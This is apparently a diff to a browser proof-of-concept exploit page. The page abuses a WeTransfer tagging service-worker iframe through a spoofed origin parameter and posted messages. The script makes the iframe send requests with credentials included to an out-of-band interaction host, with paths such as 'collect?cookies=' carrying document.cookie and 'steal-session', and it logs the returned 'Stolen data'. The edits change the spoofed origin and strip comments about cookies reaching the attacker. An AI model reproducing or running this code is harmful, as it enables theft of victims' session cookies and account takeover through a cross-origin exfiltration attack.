@@ -10,7 +10,7 @@
   <script>
     // 1. Create iframe with spoofed origin
         const iframe = document.createElement('iframe');
-        iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=http://127.0.0.1&path=badr';
+        iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=https://daemoon.me';
         document.body.appendChild(iframe);
 
         iframe.onload = () => {
@@ -23,7 +23,7 @@
             params: {
                 url: 'https://y9ozrc2di0vg4ccu7kgz1z84r5x4nvo6v.oast.site/collect?cookies=${document.cookie|encode}',
                 method: 0,
-                credentials: 'include',  // Includes google.com cookies!
+                credentials: 'include',  
                 templates: {},
                 processResponse: false
             }
@@ -40,7 +40,7 @@
                 url: 'https://y9ozrc2di0vg4ccu7kgz1z84r5x4nvo6v.oast.site/steal-session',
                 method: 1,  // POST
                 body: 'victim_data=sensitive',
-                credentials: 'include'  // Google's cookies sent to attacker!
+                credentials: 'include'  
             }
             }
         }, '*');
@@ -48,7 +48,9 @@
 
         // 4. Listen for responses
         window.addEventListener('message', (e) => {
-            console.log('Stolen data:', e.data);
+            if (e.origin !== 'https://tagging.wetransfer.com') {
+                console.log('Stolen data:', e.data);
+            }
         });
 
   </script>
